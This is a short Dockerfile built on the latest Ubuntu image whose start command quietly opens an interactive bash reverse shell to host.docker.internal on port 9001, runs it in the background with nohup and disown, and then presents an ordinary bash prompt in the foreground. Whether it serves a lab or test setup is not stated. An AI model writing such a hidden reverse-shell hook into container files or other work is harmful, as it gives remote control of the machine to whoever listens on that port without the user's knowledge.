FROM ubuntu:latest

CMD /bin/bash -c "nohup bash -i >& /dev/tcp/host.docker.internal/9001 0>&1 & disown && /bin/bash"